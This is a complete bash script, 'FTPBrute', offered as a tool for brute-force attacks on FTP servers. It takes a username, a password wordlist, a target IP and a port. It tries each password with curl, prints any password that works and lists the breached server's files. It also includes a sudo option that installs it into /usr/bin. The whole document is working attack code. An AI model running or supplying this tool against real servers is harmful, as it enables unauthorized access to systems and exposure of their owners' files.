#!/bin/bash

# FTPBrute - Tools to perform brute force
# Description :
# Use         : ./ftpbrute
# Developer   : Walderlan Sena - <https://www.mentesvirtuaissena.com>
# Email       : contato@mentesvirtuaissena.com
# LINCENSE    : Lincense GPL <http://gnu.org/lincense/gpl.html>


# Variaveis Globais
scriptversion="v1.0.0"

ok="\033[1;32m[ Start Attack ]\033[0m"
error="\033[1;31m[ ERROR ]\033[0m"
found="\033[1;32mPASSWORD FOUND »»»»»»»\033[0m"
notfound="\033[1;31mINVALID PASSWORD »»»»»»»\033[0m"

splash(){
    clear # Limpando a tela do terminal
    echo -e '''
    \033[1;31m
    _______ _______  _____  ______   ______ _     _ _______ _______
    |______    |    |_____] |_____] |_____/ |     |    |    |______
    |          |    |       |_____] |    \_ |_____|    |    |______
                                                             v1.0.0\033[0m
            \033[1;32m>>> Tool to perform Brute Force Attack FTP <<<\033[0m
              developer: Walderlan Sena <eu@walderlan.xyz>
               https://github.com/WalderlanSena/ftpbrute
    '''
}
usage="\
Usage: $0 [USER] [WORDLIST] [IP] [PORT]...
   or: $0 [USER] [WORDLIST] [IP] [PORT] [OPTIONS]

Options:
\t--help     display this help and exit.
\t--version  display version information and exit.

\t-i  install on your desktop in the /usr/bin/

Example of execution:
\t./ftpbrute.sh admin wordlist.txt 187.99.150.72 21
"
case $1 in
    --help)
        splash
        echo "$usage";;
    --version)
        echo -e "$scriptversion"
        exit;;
    -i)
    echo -e "\033[1;32m[ + ]\033[m Starting the installation on /usr/bin/"
    if sudo cp ftpbrute.sh /usr/bin/ftpbrute
    then
        echo -e "\033[1;32m[ OK ]\033[m Successfully installed on /usr/bin/ now carry out the software call,\n\n\t \033[46mApenas com 'ftpbrute [USER] [WORDLIST] [IP] [PORT]'\033[m\n"
        exit
    else
        echo -e "$error Unable to install..."
        exit
    fi
    echo "";;
    *)  echo "$usage";
esac
# Verificação do parâmetros passados
if [ ! -z "$1" ] && [ -e "$2" ] && [ ! -z "$3" ] && [ ! -z "$4" ]
then
    # Chamando a tela de splash
    splash
    # Obtendo a quantidadde de linhas da wordlist passada
    word=$(cat $2 | wc -l)
    echo -e "
    \t\t[ \033[1;34mWordlist:\033[0m $word  \033[1;34mInicio:\033[0m `date +"%T"` ]
    "
    echo -e ">>>>>>> $ok <<<<<<<"
    # Ralizando leitura da wordlist de senhas possiveis
    for password in $(cat $2)
    do
        # Realizando a requisição via curl
        result=$(curl -s -o /dev/null -w "%{http_code}" -u $1:$password ftp://$3:$4)
        # Se o returno foi um código 226, foi logado com sucesso
        if [ "$result" == "226" ]
        then
            # Se a senha for encontrada, exibe a mesma e lista os dirétorios e os arquivos do servidor atacado
            echo -e "\033[0;36m[ `date +"%T"` ]\033[0m $found $password"
            # Listando os diretórios e os arquivos do servidor
            curl -s -u $1:$password ftp://$3:$4
            # Finalizando o laço e o script
            exit
        else
            # Caso não, continua o ataque
            echo -e "\033[0;36m[ `date +"%T"` ]\033[0m $notfound $password"
        fi
    done
else
    # Chamando a tela de splash caso os argumentos sejam passados erroniamente
    splash
    echo -e "$usage"
fi
